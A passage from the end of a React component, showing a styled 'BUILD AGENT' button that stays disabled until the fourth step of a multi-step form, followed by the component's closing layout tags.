            className={`px-6 py-3 rounded-lg font-mono font-semibold transition-all duration-200 ${
              currentStep !== 4
                ? 'bg-gray-700 text-gray-500 cursor-not-allowed'
                : 'bg-green-600 hover:bg-green-700 text-white'
            }`}
          >
            BUILD AGENT
          </button>
        </div>
      </main>
    </PageLayout>
  );
}
